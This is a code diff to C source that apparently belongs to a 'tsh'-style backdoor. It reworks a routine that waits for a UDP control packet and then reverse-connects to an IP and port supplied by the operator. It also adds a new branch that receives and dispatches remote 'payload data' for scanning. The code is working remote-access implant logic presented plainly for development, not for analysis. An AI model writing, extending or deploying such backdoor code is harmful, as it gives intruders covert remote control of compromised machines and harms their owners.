@@ -61,7 +61,7 @@ void usage(char *argv0)
     exit(1);
 }
 
-int hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct sockaddr_in *outServer) {
+bool hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct sockaddr_in *outServer) {
 	static time_t lastHeartBeatTime;
 
 	if (time(NULL) - lastHeartBeatTime > MAX_UDP_HEARTBEAT) {
@@ -78,23 +78,45 @@ int hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct sockad
 
 	struct tshProtocol recvdata;
 
-	if (udpRecvPacket(udpSock, &recvdata, NULL) < 0) {
-		return -1;
+	if (!udpRecvPacket(udpSock, &recvdata, NULL)) {
+		return false;
 	}
 
-	info("udp recv from [%d.%d.%d.%d:%d]\n",
-		   __IP3(recvdata.listen_ip), __IP2(recvdata.listen_ip),
-		   __IP1(recvdata.listen_ip), __IP0(recvdata.listen_ip),
-		   __PORT(recvdata.listen_port));
-	memset((void *)outServer, '\0', (size_t)sizeof(struct sockaddr_in));
-	outServer->sin_family = AF_INET;
-	outServer->sin_addr.s_addr = recvdata.listen_ip;
-	outServer->sin_port = recvdata.listen_port;
-	if (outServer->sin_addr.s_addr == 0) {
-		outServer->sin_addr.s_addr = udpAddr->sin_addr.s_addr;
+	info("udp recv from type : 0x%08x, len : %d, [%d.%d.%d.%d:%d]\n",
+		 recvdata.type,
+		 recvdata.length,
+		 __IP3(recvdata.listen_ip), __IP2(recvdata.listen_ip),
+		 __IP1(recvdata.listen_ip), __IP0(recvdata.listen_ip),
+		 __PORT(recvdata.listen_port));
+
+	if (recvdata.type == UPD_PAYLOAD_DATA) {
+		int len = recvdata.length - sizeof(struct tshProtocol);
+		if (len > 0) {
+			char *pdata = (char *)malloc(len + 1);
+			if (pdata) {
+				memset(pdata, '\0', len + 1);
+				udpRecvData(udpSock, pdata, (size_t)len);
+				info("data is [%s]\n", pdata);
+#ifdef SCAN_IP
+				extern void handlePayloadData(const char *);
+				handlePayloadData(pdata);
+#endif
+				free((void *)pdata);
+			}
+		}
+		return false;
+	} else if (recvdata.type == UPD_BACK_CONNECT) {
+		memset((void *)outServer, '\0', (size_t)sizeof(struct sockaddr_in));
+		outServer->sin_family = AF_INET;
+		outServer->sin_addr.s_addr = recvdata.listen_ip;
+		outServer->sin_port = recvdata.listen_port;
+		if (outServer->sin_addr.s_addr == 0) {
+			outServer->sin_addr.s_addr = udpAddr->sin_addr.s_addr;
+		}
+		return true;
 	}
 
-	return 0;
+	return false;
 }
 
 /* program entry point */
@@ -272,7 +294,7 @@ int main( int argc, char **argv )
 					udpAddr = parseHostAndPort(cb_host, UDP_ProxyPort);
 				}
 				/* 如果UDP发送过来了反向连接的ip:port */
-				if(hasWaitConnectSignal(udpServer, &udpAddr, &sServer) != 0) {
+				if(!hasWaitConnectSignal(udpServer, &udpAddr, &sServer)) {
 					// 如果没有反向连接数据.
 					continue;
 				}
